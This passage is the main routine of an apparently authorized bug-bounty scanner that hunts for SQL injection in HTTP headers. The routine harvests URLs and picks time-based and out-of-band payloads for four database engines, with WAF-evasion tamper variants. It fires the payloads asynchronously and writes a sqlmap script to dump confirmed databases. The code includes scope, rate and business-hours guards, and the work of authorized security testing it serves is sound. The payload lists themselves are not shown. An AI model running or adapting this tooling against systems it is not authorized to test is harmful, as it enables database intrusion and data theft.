        if _in_business_hours(now_et):
            sys.exit(f"[!] --respect-hours: {now_et:%a %Y-%m-%d %H:%M %Z} is INSIDE core business "
                     f"hours (Mon-Fri 07:00-19:00 ET). Testing blocked without written approval. "
                     f"Omit --respect-hours only if you have approval for this window.")
        print(f"{DIM}[*] respect-hours: {now_et:%a %H:%M %Z} is outside core business hours - OK{RST}")

    # ---- OOB collaborator: flag, else prompt on a TTY ----
    if args.no_oob:
        args.collab = None
    elif not args.collab and _TTY:
        try:
            ans = input(f"{BOLD}[?]{RST} Synack collaborator domain for OOB "
                        f"(blank = skip OOB): ").strip()
            args.collab = ans or None
        except EOFError:
            args.collab = None
    if args.collab:
        args.collab = args.collab.strip().lstrip(".")
        print(f"{DIM}[*] OOB enabled -> *.{args.collab}  (watch your collaborator){RST}")

    if args.proxy:
        print(f"{DIM}[*] proxy -> {args.proxy}  (turn OFF Burp Intercept or requests will stall){RST}")

    # ---- throttle ----
    args._rate = HostRateLimiter(args.rate)

    # ---- auth headers ----
    args._auth = {}
    if args.cookie: args._auth["Cookie"] = args.cookie
    for kv in args.header:
        if ":" in kv:
            k, v = kv.split(":", 1); args._auth[k.strip()] = v.strip()

    # ---- scope-safety rails ----
    if args.no_post and args.method.upper() != "GET":
        print(f"{YEL}[*] --no-post overrides --method {args.method} -> GET{RST}")
        args.method = "GET"
    if args.passive_harvest:
        print(f"{DIM}[*] passive-harvest: active crawlers disabled (gau/waybackurls only){RST}")
    if args.no_post:
        print(f"{DIM}[*] no-post: only GET requests will be sent; form-submission replay skipped{RST}")

    # ---- payload selection ----
    want = ({"mysql", "mssql", "postgres", "oracle"} if args.dbms.strip().lower() == "all"
            else {d.strip().lower() for d in args.dbms.split(",") if d.strip()})
    time_payloads = []
    for dbms, ctx, tpl in TIME_PAYLOADS:
        if dbms not in want: continue
        for v in (tamper_variants(tpl) if args.tamper else [tpl]):
            time_payloads.append((dbms, ctx, v))
    oob_payloads = []
    for dbms, ctx, tpl in OOB_PAYLOADS:
        if dbms not in want: continue
        for v in (tamper_variants(tpl) if args.tamper else [tpl]):
            oob_payloads.append((dbms, ctx, v))
    if not time_payloads:
        sys.exit("[!] no payloads selected; check --dbms")

    # ---- headers ----
    if args.headers: headers = [h.strip() for h in args.headers.split(",") if h.strip()]
    elif args.headers_full: headers = FULL_HEADERS
    else: headers = DEFAULT_HEADERS

    # ---- build target list ----
    targets, scope_domains, url_pool = [], set(), []
    if args.input:
        domains, ready = load_targets(args.input)
        for u in ready: scope_domains.add(reg_domain(host_of(u)))
        for d in domains: scope_domains.add(reg_domain(d))
        if args.urls_only:
            ready += [f"https://{d}" for d in domains]; domains = []
        if args.harvest:                          # force-harvest hosts from ALL input lines
            domains = sorted({_host_only(u) for u in ready} | {_host_only(d) for d in domains})
            ready = []
        url_pool = list(ready)
        if domains:
            print(f"{DIM}[*] harvesting {len(domains)} domain(s) "
                  f"(depth {args.harvest_depth}, {args.harvest_workers} workers)...{RST}")
            with ThreadPoolExecutor(max_workers=args.harvest_workers) as ex:
                for d, (urls, stats) in ex.map(lambda x: (x, harvest_domain(x, args)), domains):
                    url_pool.extend(urls)
                    line = " ".join(f"{k}:{v}" for k, v in stats.items()) or "no tools"
                    print(f"{DIM}    [{_host_only(d)}] {line}  -> {len(urls)} urls{RST}")
        for u in prioritize(url_pool, args.max_per_host):
            targets.append(Target(url=u, method=args.method, extra_headers=dict(args._auth)))
        print(f"{DIM}[*] {len(url_pool)} harvested urls -> "
              f"{len(targets)} after static-filter + sample({args.max_per_host}/host){RST}")
    if args.requests_dir:
        skipped_post = 0
        for fn in sorted(os.listdir(args.requests_dir)):
            tg = parse_request_file(os.path.join(args.requests_dir, fn), args.req_scheme)
            if not tg:
                continue
            if args.no_post and tg.method.upper() != "GET":
                skipped_post += 1
                continue
            scope_domains.add(reg_domain(host_of(tg.url)))
            targets.append(tg)
        if args.no_post and skipped_post:
            print(f"{DIM}[*] no-post: skipped {skipped_post} non-GET request file(s){RST}")

    # ---- scope guard ----
    scope_suffixes, scope_res = [], []
    if args.scope:
        for s in args.scope.split(","):
            s = s.strip()
            if s.startswith("re:"): scope_res.append(re.compile(s[3:]))
            elif s: scope_suffixes.append(s.lstrip("."))
    elif not args.no_auto_scope:
        scope_suffixes = sorted(scope_domains)
    if scope_suffixes or scope_res:
        before = len(targets)
        targets = [t for t in targets if in_scope(t.url, scope_suffixes, scope_res)]
        dropped = before - len(targets)
        sc = ", ".join(scope_suffixes + [f"re:{r.pattern}" for r in scope_res])
        print(f"{DIM}[*] scope: {sc}  ({dropped} out-of-scope target(s) dropped){RST}")

    if not targets:
        sys.exit("[!] no in-scope testable targets after filtering")

    n_hosts = len({host_of(t.url) for t in targets})
    print(f"{BOLD}[*]{RST} {BOLD}{len(targets)}{RST} targets / {BOLD}{n_hosts}{RST} hosts | "
          f"headers: {','.join(headers)} | time-payloads: {len(time_payloads)}"
          f"{' | +tamper' if args.tamper else ''}"
          f"{' | +OOB' if args.collab else ''}"
          f"{' | +error' if args.error_probe else ''} | SLEEP {args.delay}s/{args.delay2}s")
    _throttle = []
    if args.rate: _throttle.append(f"rate={args.rate}/s/host")
    if args.jitter: _throttle.append(f"jitter<={args.jitter}s")
    _throttle.append(f"per-host={args.per_host}")
    if args.skip_404: _throttle.append("skip-404")
    print(f"{DIM}[*] throttle: {', '.join(_throttle)}{RST}")

    state = {"confirmed": set(), "emitted": set(), "hits": [],
             "status": {}, "oob_idx": 0, "oob_payloads": oob_payloads, "skipped_404": 0}
    # init incremental output files
    open(os.path.join(args.outdir, "hits.jsonl"), "w").close()
    with open(os.path.join(args.outdir, "sqlmap_commands.sh"), "w") as fh:
        fh.write("#!/usr/bin/env bash\n# Confirmed header SQLi -> validate & dump.\n\n")
    os.chmod(os.path.join(args.outdir, "sqlmap_commands.sh"), 0o755)

    t0 = time.time()
    try:
        asyncio.run(scan(targets, headers, time_payloads, args, state))
    finally:
        finalize_reports(state, args.outdir)
    dur = int(time.time() - t0)

    # ---- block-rate warnings ----
    for host, c in state["status"].items():
        if c["total"] >= 5 and c["blocked"] / c["total"] > 0.3:
            print(f"{YEL}[!] {host}: {c['blocked']}/{c['total']} responses were "
                  f"403/429/5xx — likely WAF/rate-limit; results may be unreliable "
                  f"(try --tamper or --jitter).{RST}")

    if state.get("skipped_404"):
        print(f"{DIM}[*] skip-404: {state['skipped_404']} URL(s) skipped as non-existent (404/410){RST}")
    print(f"\n{BOLD}{'=' * 62}{RST}")
    tb = sum(1 for h in state["hits"] if h.technique == "time-based")
    eb = sum(1 for h in state["hits"] if h.technique == "error-based")
    if state["hits"]:
        print(f"{BOLD}{GRN}[+] {len(state['hits'])} finding(s) in {dur}s"
              f"  (time-based:{tb}  error-based:{eb}){RST}")
        print(f"    req files : {args.outdir}/hits/")
        print(f"    sqlmap    : {args.outdir}/sqlmap_commands.sh")
        print(f"    json/csv  : {args.outdir}/hits.json , hits.csv")
    else:
        print(f"{YEL}[-] No time/error findings in {dur}s.{RST}")
    if args.collab:
        print(f"\n{BOLD}{CYN}[OOB]{RST} {state['oob_idx']} correlated callouts fired -> "
              f"watch {BOLD}*.{args.collab}{RST}")
        print(f"      map: {args.outdir}/oob_correlation.csv")
        print(f"      when a subdomain lights up:  "
              f"{DIM}python3 {os.path.basename(sys.argv[0])} -o {args.outdir} "
              f"--rebuild-req <token>{RST}")

if __name__ == "__main__":
    try:
        import warnings; warnings.filterwarnings("ignore")
        main()
    except KeyboardInterrupt:
        print(f"\n{YEL}[!] interrupted — findings already saved to disk{RST}")
        sys.exit(130)
